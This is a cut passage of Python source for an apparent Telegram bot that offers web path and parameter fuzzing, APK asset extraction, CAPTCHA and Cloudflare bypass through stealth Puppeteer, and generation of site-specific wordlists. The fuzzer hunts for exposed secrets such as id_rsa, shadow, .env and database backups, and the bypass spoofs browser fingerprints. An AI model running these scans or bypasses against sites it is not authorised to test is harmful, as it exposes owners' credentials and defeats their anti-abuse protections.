    "cmd","exec","command","query","search","q","type","action","method",
    "format","output","lang","language","locale","theme","template","view",
    "include","require","load","src","source","data","payload","input",
    "name","pass","password","hash","sig","signature","auth","session",
    "api_key","access_token","refresh_token","client_id","client_secret",
]

def _fuzz_sync(base: str, mode: str, progress_q: list) -> tuple:
    """Run path or parameter fuzzing."""
    found    = []

    # ── Baseline: get 404 fingerprint ───────────────
    try:
        r404 = requests.get(
            base.rstrip("/") + "/this_path_will_never_exist_xyz_abc_123",
            timeout=6, verify=False, headers=_get_headers(),
            proxies=proxy_manager.get_proxy()
        )
        baseline_status = r404.status_code
        baseline_size   = len(r404.content)
        baseline_hash   = hashlib.md5(r404.content[:512]).hexdigest()
    except Exception:
        baseline_status, baseline_size, baseline_hash = 404, 0, ""

    def _is_interesting(r_status, r_size, r_hash):
        """Filter out baseline 404 catch-all responses."""
        if r_status == baseline_status:
            if r_hash and r_hash == baseline_hash:
                return False
            if baseline_size > 0 and abs(r_size - baseline_size) < 50:
                return False
        return r_status in (200, 201, 204, 301, 302, 307, 401, 403, 500)

    def _probe(target_url):
        try:
            r = requests.get(
                target_url, timeout=5, verify=False, headers=_get_headers(),
                allow_redirects=True, stream=True,
                proxies=proxy_manager.get_proxy()
            )
            chunk = b""
            for part in r.iter_content(1024):
                chunk += part
                if len(chunk) >= 1024: break
            r.close()
            r_size = int(r.headers.get("Content-Length", len(chunk)))
            r_hash = hashlib.md5(chunk[:512]).hexdigest()
            r_ct   = r.headers.get("Content-Type","")[:30]
            if _is_interesting(r.status_code, r_size, r_hash):
                return {
                    "url":    target_url,
                    "status": r.status_code,
                    "size":   r_size,
                    "ct":     r_ct,
                    "title":  "",
                }
        except Exception:
            pass
        return None

    if mode == "params":
        targets = [f"{base}?{p}=FUZZ" for p in _FUZZ_PARAMS]
    else:
        targets = [f"{base.rstrip('/')}/{p}" for p in _FUZZ_PATHS]

    done = 0
    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
        fmap = {ex.submit(_probe, t): t for t in targets}
        for fut in concurrent.futures.as_completed(fmap, timeout=90):
            done += 1
            if done % 20 == 0:
                progress_q.append(
                    f"🧪 Fuzzing... `{done}/{len(targets)}` tested | `{len(found)}` found"
                )
            try:
                res = fut.result(timeout=8)
                if res:
                    found.append(res)
            except Exception:
                pass

    found.sort(key=lambda x: (x["status"] != 200, x["status"]))
    return found, baseline_status


async def cmd_fuzz(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/fuzz <url> [paths|params] — HTTP path & parameter fuzzer"""
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:*\n"
            f"`/fuzz https://example.com` — Path fuzzing ({len(_FUZZ_PATHS)} paths)\n"
            f"`/fuzz https://example.com params` — Parameter fuzzing ({len(_FUZZ_PARAMS)} params)\n\n"
            "🧪 *Path mode detects:*\n"
            "  • Hidden admin panels & login pages\n"
            "  • Backup & config files (.env, .sql, .bak)\n"
            "  • Debug endpoints & info disclosure\n"
            "  • Framework internals (Actuator, GraphQL...)\n"
            "  • Log files & source leaks\n\n"
            "🔬 *Param mode detects:*\n"
            "  • Active query parameters\n"
            "  • Open redirect parameters\n"
            "  • Debug/admin param flags\n\n"
            "✅ Baseline fingerprinting to eliminate false positives\n"
            "⚠️ _Authorized testing only._",
            parse_mode='Markdown'
        )
        return

    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    url = context.args[0].strip()
    if not url.startswith('http'):
        url = 'https://' + url
    mode = context.args[1].lower() if len(context.args) > 1 and context.args[1].lower() in ('paths','params') else 'paths'

    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    domain   = urlparse(url).hostname
    base_url = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
    wordlist = _FUZZ_PATHS if mode == 'paths' else _FUZZ_PARAMS

    msg = await update.effective_message.reply_text(
        f"🧪 *Fuzzing `{domain}`* [{mode}]\n"
        f"Wordlist: `{len(wordlist)}` entries\n"
        "Baseline fingerprinting active...\n⏳",
        parse_mode='Markdown'
    )

    progress_q = []

    async def _prog():
        while True:
            await asyncio.sleep(3)
            if progress_q:
                txt = progress_q[-1]; progress_q.clear()
                try:
                    await msg.edit_text(
                        f"🧪 *Fuzzing `{domain}`* [{mode}]\n\n{txt}", parse_mode='Markdown')
                except Exception:
                    pass

    prog = asyncio.create_task(_prog())
    try:
        found, baseline_st = await asyncio.to_thread(
            _fuzz_sync, base_url if mode == 'paths' else url, mode, progress_q
        )
    except Exception as e:
        prog.cancel()
        await msg.edit_text(f"❌ Error: `{e}`", parse_mode='Markdown')
        return
    finally:
        prog.cancel()

    st_icons = {
        200:"✅", 201:"✅", 204:"✅",
        301:"↪️", 302:"↩️", 307:"🔄",
        401:"🔑", 403:"🔒", 500:"💥"
    }
    risk_words = {
        "paths": ['backup','.env','admin','config','debug','.sql','.bak',
                   'password','secret','credential','id_rsa','passwd','shadow',
                   'actuator','phpinfo','phpmyadmin','adminer'],
        "params": ['cmd','exec','command','file','path','url','redirect',
                   'include','require','load','src'],
    }

    lines = [
        f"🧪 *Fuzz Results — `{domain}`* [{mode}]",
        f"Baseline: `{baseline_st}` | Found: `{len(found)}` interesting\n",
    ]

    if not found:
        lines.append("🔒 Nothing found — well hardened!")
    else:
        # Categorize
        critical = [r for r in found if r["status"] == 200 and
                    any(w in r["url"].lower() for w in risk_words.get(mode, []))]
        normal   = [r for r in found if r not in critical]

        if critical:
            lines.append(f"*🔴 High-Risk ({len(critical)}):*")
            for item in critical[:10]:
                icon = st_icons.get(item["status"], f"⚙️")
                path = item["url"].replace(base_url, "")
                lines.append(
                    f"  {icon} `{item['status']}` `{path[:60]}` _{item['size']}b_"
                )
            lines.append("")

        if normal:
            lines.append(f"*🟡 Interesting ({len(normal)}):*")
            for item in normal[:20]:
                icon = st_icons.get(item["status"], f"⚙️")
                path = item["url"].replace(base_url, "")
                lines.append(
                    f"  {icon} `{item['status']}` `{path[:60]}` _{item['size']}b_"
                )
            if len(normal) > 20:
                lines.append(f"  _…{len(normal)-20} more in report_")

    lines.append("\n⚠️ _Passive fuzzing. No exploitation._")

    # ── Always export JSON report ──────────────────
    import io as _io
    report = json.dumps({
        "target": url, "mode": mode, "domain": domain,
        "scanned_at": datetime.now().isoformat(),
        "baseline_status": baseline_st,
        "wordlist_size": len(wordlist),
        "findings_count": len(found),
        "findings": [{
            "url":    r["url"],
            "path":   r["url"].replace(base_url,""),
            "status": r["status"],
            "size":   r["size"],
            "content_type": r["ct"],
            "high_risk": any(w in r["url"].lower() for w in risk_words.get(mode,[])),
        } for r in found],
    }, indent=2)

    tg_text = "\n".join(lines)
    try:
        await msg.edit_text(tg_text[:4000], parse_mode='Markdown')
    except Exception:
        pass

    buf = _io.BytesIO(report.encode())
    ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_d = re.sub(r'[^\w\-]', '_', domain)
    await context.bot.send_document(
        chat_id=update.effective_chat.id,
        document=buf,
        filename=f"fuzz_{mode}_{safe_d}_{ts}.json",
        caption=(
            f"🧪 *Fuzz Report — `{domain}`* [{mode}]\n"
            f"Found: `{len(found)}` | Baseline: `{baseline_st}`\n"
            f"Wordlist: `{len(wordlist)}` entries"
        ),
        parse_mode='Markdown'
    )


# ══════════════════════════════════════════════════
# 📢  FEATURE 8 — Force Join Channel (Must-Sub)
# ══════════════════════════════════════════════════
# DB structure: db["settings"]["force_channels"] = ["@channelusername", ...]
# Admin IDs always bypass — no check needed.

async def _get_force_channels(db: dict) -> list:
    return db.get("settings", {}).get("force_channels", [])

async def check_force_join(update: Update, context) -> bool:
    """
    Returns True if user is allowed to proceed.
    Admin always passes. Regular users must be member of all force channels.
    """
    uid = update.effective_user.id
    if uid in ADMIN_IDS:
        return True  # Admin — always free

    async with db_lock:
        db = _load_db_sync()
    channels = await _get_force_channels(db)
    if not channels:
        return True  # No force join configured — allow all

    not_joined = []
    for ch in channels:
        try:
            member = await context.bot.get_chat_member(chat_id=ch, user_id=uid)
            if member.status in ("left", "kicked", "banned"):
                not_joined.append(ch)
        except Exception:
            not_joined.append(ch)

    if not not_joined:
        return True

    # Build join buttons
    kb = []
    for ch in not_joined:
        label = ch if ch.startswith('@') else f"Channel"
        invite_link = ch if ch.startswith('@') else ch
        kb.append([InlineKeyboardButton(f"📢 {label} ကို Join လုပ်ပါ", url=f"https://t.me/{invite_link.lstrip('@')}")])
    kb.append([InlineKeyboardButton("✅ Join ပြီး — စစ်ဆေးပါ", callback_data="fj_check")])

    await update.effective_message.reply_text(
        "🔒 *Bot ကို သုံးရန် Channel Join လုပ်ရပါမည်*\n\n"
        "အောက်ပါ Channel(s) ကို Join ပြီးမှ ဆက်လုပ်ပါ:\n\n"
        + "\n".join(f"  • {ch}" for ch in not_joined),
        reply_markup=InlineKeyboardMarkup(kb),
        parse_mode='Markdown'
    )
    return False


async def force_join_callback(update: Update, context) -> None:
    """Callback for '✅ Join ပြီး — စစ်ဆေးပါ' button"""
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id

    async with db_lock:
        db = _load_db_sync()
    channels = await _get_force_channels(db)

    not_joined = []
    for ch in channels:
        try:
            member = await context.bot.get_chat_member(chat_id=ch, user_id=uid)
            if member.status in ("left", "kicked", "banned"):
                not_joined.append(ch)
        except Exception:
            not_joined.append(ch)

    if not not_joined:
        try:
            await query.edit_message_text(
                "✅ *စစ်ဆေးမှု အောင်မြင်ပါပြီ!*\n\n"
                "Bot ကို အခုသုံးလို့ ရပါပြီ 🎉\n"
                "/start ကို နှိပ်ပါ",
                parse_mode='Markdown'
            )
        except BadRequest:
            pass  # Message already same content — ignore
    else:
        kb = []
        for ch in not_joined:
            kb.append([InlineKeyboardButton(
                f"📢 {ch} ကို Join လုပ်ပါ",
                url=f"https://t.me/{ch.lstrip('@')}"
            )])
        kb.append([InlineKeyboardButton("✅ Join ပြီး — စစ်ဆေးပါ", callback_data="fj_check")])
        new_text = (
            "❌ *မပြည့်စုံသေးပါ*\n\n"
            "အောက်ပါ channel(s) ကို မဖြစ်မနေ Join ပါ:\n\n"
            + "\n".join(f"  • {ch}" for ch in not_joined)
        )
        try:
            await query.edit_message_text(
                new_text,
                reply_markup=InlineKeyboardMarkup(kb),
                parse_mode='Markdown'
            )
        except BadRequest:
            # Message not modified (same channels) — just answer silently
            await query.answer("မပြည့်စုံသေးပါ — Channel Join ပြီးမှ ထပ်နှိပ်ပါ", show_alert=True)


async def appassets_cat_callback(update: Update, context) -> None:
    """Callback for /appassets category selection buttons."""
    query = update.callback_query
    await query.answer()
    uid  = query.from_user.id
    data = query.data  # apa_images / apa_all / etc.

    cat = data[4:]  # strip "apa_"
    valid_cats = set(_ASSET_CATEGORIES.keys())

    if cat == "all":
        wanted_cats = valid_cats.copy()
    elif cat in valid_cats:
        wanted_cats = {cat}
    else:
        try: await query.edit_message_text("❌ Unknown category")
        except BadRequest: pass
        return

    async with db_lock:
        db = _load_db_sync()
    u = get_user(db, uid)
    last_app = u.get("last_uploaded_app")

    if not last_app or not os.path.exists(last_app):
        try:
            await query.edit_message_text(
                "⚠️ ဖိုင် မတွေ့တော့ပါ — APK/IPA/ZIP ကို ထပ် upload ပါ"
            )
        except BadRequest: pass
        return

    try:
        await query.edit_message_text(
            f"📦 Extracting `{', '.join(sorted(wanted_cats))}` from "
            f"`{os.path.basename(last_app)}`...\n⏳"
        )
    except BadRequest:
        pass

    # Use query.message as message target — send new reply
    await _do_appassets_extract(query.message, context, last_app, wanted_cats)


@admin_only
async def cmd_setforcejoin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/setforcejoin @channel1 @channel2 ... | /setforcejoin off"""
    if not context.args:
        async with db_lock:
            db = _load_db_sync()
        chs = await _get_force_channels(db)
        await update.effective_message.reply_text(
            "📢 *Force Join Settings*\n\n"
            f"လက်ရှိ channels: `{'None' if not chs else ', '.join(chs)}`\n\n"
            "Usage:\n"
            "`/setforcejoin @mychannel` — Channel တစ်ခု set\n"
            "`/setforcejoin @ch1 @ch2` — Channel နှစ်ခု\n"
            "`/setforcejoin off` — ပိတ်မည်\n\n"
            "⚠️ Bot ကို Channel admin ထဲ ထည့်ထားဖို့ မမေ့ပါနဲ့",
            parse_mode='Markdown'
        )
        return

    async with db_lock:
        db = _load_db_sync()
        if context.args[0].lower() == "off":
            db["settings"]["force_channels"] = []
            _save_db_sync(db)
            await update.effective_message.reply_text("✅ Force Join ပိတ်လိုက်ပါပြီ")
            return
        channels = [a if a.startswith('@') else '@' + a for a in context.args]
        db["settings"]["force_channels"] = channels
        _save_db_sync(db)

    await update.effective_message.reply_text(
        f"✅ *Force Join set လုပ်ပြီး*\n\n"
        f"Channels: {', '.join(f'`{c}`' for c in channels)}\n\n"
        "Users တွေ join မလုပ်ရင် Bot သုံးခွင့် မရတော့ပါ\n"
        "⚠️ Bot ကို အဆိုပါ channel(s) မှာ admin အဖြစ် ထည့်ထားဖို့ မမေ့နဲ့",
        parse_mode='Markdown'
    )


# ══════════════════════════════════════════════════
# 📦  FEATURE 9 — Advanced APK Asset Extractor (/appassets)
# ══════════════════════════════════════════════════

_ASSET_CATEGORIES = {
    "images":   {'.png','.jpg','.jpeg','.gif','.webp','.svg','.bmp','.ico','.avif'},
    "audio":    {'.mp3','.wav','.ogg','.aac','.flac','.m4a','.opus'},
    "video":    {'.mp4','.webm','.mkv','.avi','.mov','.m4v','.3gp'},
    "layouts":  {'.xml'},
    "dex":      {'.dex'},
    "so_libs":  {'.so'},
    "fonts":    {'.ttf','.otf','.woff','.woff2'},
    "certs":    {'.pem','.cer','.crt','.p12','.pfx','.keystore','.jks'},
    "configs":  {'.json','.yaml','.yml','.properties','.cfg','.conf','.ini'},
    "scripts":  {'.js','.py','.sh','.rb','.php'},
    "docs":     {'.pdf','.txt','.md','.html','.htm'},
    "archives": {'.zip','.tar','.gz','.rar','.7z'},
}

def _categorize_asset(filename: str) -> str:
    ext = os.path.splitext(filename.lower())[1]
    for cat, exts in _ASSET_CATEGORIES.items():
        if ext in exts:
            return cat
    return "other"

def _extract_apk_assets_sync(filepath: str, wanted_cats: set, progress_cb=None) -> dict:
    """Extract assets from APK/IPA/ZIP by category."""
    result = {"files": {}, "stats": {}, "errors": []}

    if not zipfile.is_zipfile(filepath):
        result["errors"].append("Not a valid ZIP/APK/IPA file")
        return result

    with zipfile.ZipFile(filepath, 'r') as zf:
        names = zf.namelist()
        total = len(names)
        categorized = {}
        for name in names:
            cat = _categorize_asset(name)
            if cat in wanted_cats:
                categorized.setdefault(cat, []).append(name)

        result["stats"]["total_files"] = total
        for cat, files in categorized.items():
            result["stats"][cat] = len(files)

        # Extract to BytesIO zip
        import io
        out_buf = io.BytesIO()
        extracted = 0
        MAX_EXTRACT = 200  # max files per export
        with zipfile.ZipFile(out_buf, 'w', zipfile.ZIP_DEFLATED) as out_zf:
            for cat in wanted_cats:
                files = categorized.get(cat, [])
                for i, fname in enumerate(files[:MAX_EXTRACT]):
                    try:
                        data = zf.read(fname)
                        # Flatten long paths
                        short_name = f"{cat}/{os.path.basename(fname)}"
                        out_zf.writestr(short_name, data)
                        extracted += 1
                        if progress_cb and extracted % 20 == 0:
                            progress_cb(f"📦 Extracting... `{extracted}` files")
                    except Exception as e:
                        result["errors"].append(f"{fname}: {e}")

        result["extracted"] = extracted
        result["zip_buffer"] = out_buf
    return result


async def cmd_appassets(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/appassets — Extract specific asset types from uploaded APK/IPA/ZIP"""
    uid = update.effective_user.id

    # Force join check
    if not await check_force_join(update, context):
        return

    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    # Check if user has a recently uploaded file
    async with db_lock:
        db = _load_db_sync()
    u = get_user(db, uid)
    last_app = u.get("last_uploaded_app")

    if not last_app or not os.path.exists(last_app):
        await update.effective_message.reply_text(
            "📦 *APK Asset Extractor*\n\n"
            "APK / IPA / ZIP / JAR ဖိုင်ကို ဦးစွာ Chat ထဲ Upload လုပ်ပါ\n"
            "Upload ပြီးရင် `/appassets` ကို ရိုက်ပြီး Category ရွေးပါ\n\n"
            "Extract လုပ်နိုင်သော Category များ:\n"
            "🖼 `images` — PNG, JPG, SVG, WebP\n"
            "🎵 `audio` — MP3, WAV, OGG, AAC\n"
            "🎬 `video` — MP4, WebM, MKV\n"
            "📐 `layouts` — XML Layout files\n"
            "⚙️ `dex` — classes.dex (bytecode)\n"
            "🔧 `so_libs` — .so Native libraries\n"
            "🔤 `fonts` — TTF, OTF, WOFF\n"
            "🔒 `certs` — PEM, CER, Keystores\n"
            "📋 `configs` — JSON, YAML, Properties\n"
            "📝 `scripts` — JS, Python, Shell\n"
            "📄 `docs` — PDF, TXT, HTML\n"
            "🗜 `archives` — ZIP, TAR, GZ",
            parse_mode='Markdown'
        )
        return

    # Parse category args
    valid_cats = set(_ASSET_CATEGORIES.keys())
    wanted_cats = set()
    if context.args:
        for a in context.args:
            a = a.lower().strip()
            if a == "all":
                wanted_cats = valid_cats.copy()
                break
            if a in valid_cats:
                wanted_cats.add(a)

    if not wanted_cats:
        # Build selection keyboard
        rows = []
        cats_list = list(valid_cats)
        for i in range(0, len(cats_list), 3):
            row = [InlineKeyboardButton(c, callback_data=f"apa_{c}") for c in cats_list[i:i+3]]
            rows.append(row)
        rows.append([InlineKeyboardButton("📦 ALL Categories", callback_data="apa_all")])
        await update.effective_message.reply_text(
            "📦 *Extract လုပ်မည့် Category ရွေးပါ:*\n\n"
            "_(သို့မဟုတ်)_ `/appassets images audio layouts` ဟု ရိုက်နိုင်သည်",
            reply_markup=InlineKeyboardMarkup(rows),
            parse_mode='Markdown'
        )
        return

    await _do_appassets_extract(update, context, last_app, wanted_cats)


async def _do_appassets_extract(update_or_msg, context, filepath: str, wanted_cats: set):
    import io
    # Support both Update objects and raw Message objects
    if hasattr(update_or_msg, 'effective_message'):
        target_msg  = update_or_msg.effective_message
        chat_id     = update_or_msg.effective_chat.id
    else:
        # Raw Message (from callback)
        target_msg  = update_or_msg
        chat_id     = update_or_msg.chat_id

    fname = os.path.basename(filepath)
    msg = await target_msg.reply_text(
        f"📦 *Asset Extractor — `{fname}`*\n\n"
        f"Categories: `{', '.join(sorted(wanted_cats))}`\n"
        "⏳ Extracting...",
        parse_mode='Markdown'
    )
    progress_q = []

    async def _prog():
        while True:
            await asyncio.sleep(2)
            if progress_q:
                txt = progress_q[-1]; progress_q.clear()
                try:
                    await msg.edit_text(
                        f"📦 *Extracting `{fname}`*\n\n{txt}", parse_mode='Markdown')
                except Exception:
                    pass

    prog = asyncio.create_task(_prog())
    try:
        result = await asyncio.to_thread(
            _extract_apk_assets_sync, filepath, wanted_cats,
            lambda t: progress_q.append(t)
        )
    except Exception as e:
        prog.cancel()
        await msg.edit_text(f"❌ Error: `{e}`", parse_mode='Markdown')
        return
    finally:
        prog.cancel()

    if result.get("errors") and result.get("extracted", 0) == 0:
        await msg.edit_text(f"❌ `{'\\n'.join(result['errors'][:3])}`", parse_mode='Markdown')
        return

    stats = result["stats"]
    extracted = result.get("extracted", 0)
    zip_buf: io.BytesIO = result.get("zip_buffer")

    if extracted == 0:
        stat_lines = "\n".join(f"  {cat}: `0`" for cat in sorted(wanted_cats))
        await msg.edit_text(
            f"📭 *No files found*\n\nCategory တွေမှာ ဖိုင် မတွေ့ပါ:\n{stat_lines}",
            parse_mode='Markdown'
        )
        return

    stat_lines = "\n".join(
        f"  {cat}: `{stats.get(cat, 0)}`" for cat in sorted(wanted_cats)
    )
    zip_buf.seek(0)
    zip_size_mb = zip_buf.getbuffer().nbytes / 1024 / 1024

    await msg.edit_text(
        f"✅ *Extraction ပြီးပါပြီ*\n\n"
        f"📦 Extracted: `{extracted}` files\n"
        f"💾 Size: `{zip_size_mb:.2f}` MB\n\n"
        f"*Per Category:*\n{stat_lines}\n\n"
        "📤 ZIP upload နေပါသည်...",
        parse_mode='Markdown'
    )

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_fname = re.sub(r'[^\w\-]', '_', os.path.splitext(os.path.basename(filepath))[0])
    zip_name = f"assets_{safe_fname}_{ts}.zip"

    try:
        await context.bot.send_document(
            chat_id=chat_id,
            document=zip_buf,
            filename=zip_name,
            caption=(
                f"📦 *APK Assets — `{os.path.basename(filepath)}`*\n"
                f"📂 `{extracted}` files extracted\n"
                f"💾 `{zip_size_mb:.2f}` MB\n"
                f"Categories: `{', '.join(sorted(wanted_cats))}`"
            ),
            parse_mode='Markdown'
        )
    except Exception as e:
        await target_msg.reply_text(f"❌ Upload error: `{e}`", parse_mode='Markdown')


# ══════════════════════════════════════════════════
# 🤖  FEATURE 10 — Anti-Bot & Captcha Bypass (/antibot)
# ══════════════════════════════════════════════════

async def cmd_antibot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/antibot <url> — Cloudflare/hCaptcha bypass via human-like Puppeteer"""
    if not await check_force_join(update, context):
        return

    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/antibot https://example.com`\n\n"
            "🤖 *Bypass Methods:*\n"
            "  ① Human-like mouse movement + delay simulation\n"
            "  ② Random viewport + timezone spoofing\n"
            "  ③ Canvas/WebGL fingerprint randomization\n"
            "  ④ Stealth Puppeteer (navigator.webdriver=false)\n"
            "  ⑤ Cloudflare Turnstile passive challenge wait\n"
            "  ⑥ hCaptcha detection + fallback screenshot\n\n"
            "⚙️ *Requirements:*\n"
            "  `node js_antibot.js` script + puppeteer-extra-plugin-stealth\n\n"
            "⚠️ _Authorized testing only_",
            parse_mode='Markdown'
        )
        return

    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    url = context.args[0].strip()
    if not url.startswith('http'):
        url = 'https://' + url

    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    if not PUPPETEER_OK:
        await update.effective_message.reply_text(
            "❌ *Puppeteer မရှိသေးပါ*\n\n"
            "Setup:\n"
            "```\nnpm install puppeteer puppeteer-extra puppeteer-extra-plugin-stealth\n```",
            parse_mode='Markdown'
        )
        return

    domain = urlparse(url).netloc
    msg = await update.effective_message.reply_text(
        f"🤖 *Anti-Bot Bypass — `{domain}`*\n\n"
        "① Stealth mode on\n"
        "② Human-like behavior injecting...\n"
        "③ Waiting for challenge...\n⏳",
        parse_mode='Markdown'
    )

    antibot_script = os.path.join(os.path.dirname(os.path.abspath(__file__)), "js_antibot.js")

    def _run_antibot():
        if not os.path.exists(antibot_script):
            # Inline fallback — use existing js_render with stealth hint
            return _run_antibot_fallback(url)
        try:
            result = subprocess.run(
                ["node", antibot_script, url],
                capture_output=True, timeout=90, text=True, shell=False
            )
            if result.returncode == 0 and result.stdout.strip():
                return {"success": True, "html": result.stdout, "method": "stealth_puppeteer"}
            return {"success": False, "error": result.stderr[:200] or "Empty response"}
        except subprocess.TimeoutExpired:
            return {"success": False, "error": "Timeout (90s) — challenge too complex"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def _run_antibot_fallback(url: str) -> dict:
        """Fallback — try puppeteer with delay headers if no antibot script"""
        if not PUPPETEER_OK:
            return {"success": False, "error": "Puppeteer not available"}
        try:
            result = subprocess.run(
                ["node", JS_RENDER, url],
                capture_output=True, timeout=60, text=True, shell=False
            )
            if result.returncode == 0 and result.stdout.strip():
                return {"success": True, "html": result.stdout, "method": "js_render_fallback"}
            return {"success": False, "error": "JS render failed"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    try:
        res = await asyncio.to_thread(_run_antibot)
    except Exception as e:
        await msg.edit_text(f"❌ Error: `{e}`", parse_mode='Markdown')
        return

    if not res["success"]:
        await msg.edit_text(
            f"❌ *Bypass မအောင်မြင်ဘူး*\n\n"
            f"Error: `{res['error']}`\n\n"
            "_Challenge level မြင့်လွန်းနိုင်သည် သို့မဟုတ် manual CAPTCHA solve လိုနိုင်ပါသည်_",
            parse_mode='Markdown'
        )
        return

    html = res["html"]
    method = res.get("method", "unknown")
    html_size_kb = len(html.encode()) / 1024

    # Save and send as file
    import io
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_d = re.sub(r'[^\w\-]', '_', domain)
    html_buf = io.BytesIO(html.encode('utf-8', errors='replace'))

    await msg.edit_text(
        f"✅ *Bypass အောင်မြင်ပါပြီ!*\n\n"
        f"🌐 `{domain}`\n"
        f"⚙️ Method: `{method}`\n"
        f"📄 HTML Size: `{html_size_kb:.1f}` KB\n\n"
        "📤 HTML file upload နေပါသည်...",
        parse_mode='Markdown'
    )

    try:
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=html_buf,
            filename=f"antibot_{safe_d}_{ts}.html",
            caption=(
                f"🤖 *Anti-Bot Bypass — `{domain}`*\n"
                f"Method: `{method}`\n"
                f"Size: `{html_size_kb:.1f}` KB"
            ),
            parse_mode='Markdown'
        )
    except Exception as e:
        await update.effective_message.reply_text(f"❌ Upload: `{e}`", parse_mode='Markdown')


# ══════════════════════════════════════════════════
# 🗂️  FEATURE 11 — Smart Context-Aware Fuzzer (/smartfuzz)
#     CeWL-style wordlist generator + fuzzer
# ══════════════════════════════════════════════════

_SMARTFUZZ_STOP_WORDS = {
    'the','a','an','in','on','at','for','of','to','is','are','was','were',
    'and','or','but','if','with','this','that','from','by','not','it',
    'be','as','we','you','he','she','they','have','has','had','do','does',
    'did','will','would','could','should','may','might','can','our','your',
    'their','its','which','who','what','how','when','where','why',
}

def _build_context_wordlist(url: str, progress_cb=None) -> tuple:
    """
    CeWL-style: scrape target, extract unique words → generate permutations.
    Returns (wordlist: list, raw_words: list)
    """
    parsed = urlparse(url)
    root   = f"{parsed.scheme}://{parsed.netloc}"
    domain_parts = parsed.netloc.replace('www.', '').split('.')

    all_words = set()

    # ── Scrape homepage + up to 3 internal pages ──
    try:
        r = requests.get(url, headers=_get_headers(), timeout=12, verify=False, proxies=proxy_manager.get_proxy())
        soup = BeautifulSoup(r.text, 'html.parser')
        if progress_cb:
            progress_cb("🌐 Homepage scraped")

        # Extract text words
        for tag in soup.find_all(['h1','h2','h3','h4','title','p','li','span','a','button','label']):
            text = tag.get_text(separator=' ')
            for w in re.findall(r'[a-zA-Z0-9_\-]{3,20}', text):
                all_words.add(w.lower())

        # Extract from meta tags
        for meta in soup.find_all('meta'):
            content = meta.get('content', '') + ' ' + meta.get('name', '')
            for w in re.findall(r'[a-zA-Z0-9_\-]{3,20}', content):
                all_words.add(w.lower())

        # Extract from JS variables / identifiers
        for script in soup.find_all('script'):
            src_text = script.string or ''
            for w in re.findall(r'(?:var|let|const|function)\s+([a-zA-Z_][a-zA-Z0-9_]{2,20})', src_text):
                all_words.add(w.lower())

        # Extract from class names and IDs
        for tag in soup.find_all(True):
            for attr in ('class', 'id', 'name'):
                vals = tag.get(attr, [])
                if isinstance(vals, str):
                    vals = [vals]
                for v in vals:
                    for w in re.split(r'[-_\s]', v):
                        if 3 <= len(w) <= 20:
                            all_words.add(w.lower())

        # Crawl 3 more internal pages
        links = list(get_internal_links(r.text, url))[:3]
        for link in links:
            try:
                r2 = requests.get(link, headers=_get_headers(), timeout=8, verify=False, proxies=proxy_manager.get_proxy())
                soup2 = BeautifulSoup(r2.text, 'html.parser')
                for tag in soup2.find_all(['h1','h2','h3','title','p']):
                    for w in re.findall(r'[a-zA-Z0-9_\-]{3,20}', tag.get_text()):
                        all_words.add(w.lower())
            except Exception:
                pass

    except Exception as e:
        if progress_cb:
            progress_cb(f"⚠️ Scrape error: {e}")

    # Add domain parts
    for part in domain_parts:
        all_words.add(part.lower())

    # Filter stop words + numeric-only
    raw_words = sorted(
        w for w in all_words
        if w not in _SMARTFUZZ_STOP_WORDS and not w.isdigit() and len(w) >= 3
    )

    if progress_cb:
        progress_cb(f"📝 Raw words: `{len(raw_words)}`")

    # ── Generate permutations ──────────────────────
    current_year = datetime.now().year
    years        = [str(y) for y in range(current_year - 3, current_year + 2)]
    suffixes      = ['', '_backup', '_old', '_bak', '.bak', '_2025', '_2024',
                     '_dev', '_test', '_staging', '_prod', '_new', '_v2',
                     '.zip', '.sql', '.tar.gz', '.env', '.json']
    prefixes      = ['', 'backup_', 'old_', 'dev_', 'test_', 'admin_', 'api_',
                     '.', '_']

    wordlist = set()

    # Base words
    for w in raw_words[:80]:   # top 80 words
        wordlist.add(w)
        wordlist.add(w + '.php')
        wordlist.add(w + '.html')
        wordlist.add(w + '.txt')
        # Year combos
        for yr in years[:3]:
            wordlist.add(f"{w}_{yr}")
            wordlist.add(f"{w}_{yr}.zip")
            wordlist.add(f"{w}_{yr}.sql")
        # Suffix combos
        for suf in suffixes[:8]:
            wordlist.add(w + suf)
        # Prefix combos
        for pfx in prefixes[:5]:
            if pfx:
                wordlist.add(pfx + w)

    # Domain-specific combos
    for part in domain_parts[:3]:
        for yr in years:
            wordlist.add(f"{part}_{yr}")
            wordlist.add(f"{part}_{yr}.zip")
            wordlist.add(f"{part}_backup_{yr}")
            wordlist.add(f"backup_{part}")
            wordlist.add(f"{part}_db.sql")
            wordlist.add(f"{part}.sql")

    final_wordlist = sorted(wordlist)
    if progress_cb:
        progress_cb(f"🎯 Wordlist: `{len(final_wordlist)}` entries generated")

    return final_wordlist, raw_words


def _smartfuzz_probe_sync(base_url: str, wordlist: list, progress_cb=None) -> list:
    """Probe all wordlist entries against target."""
    found = []

    # Baseline fingerprint
    try:
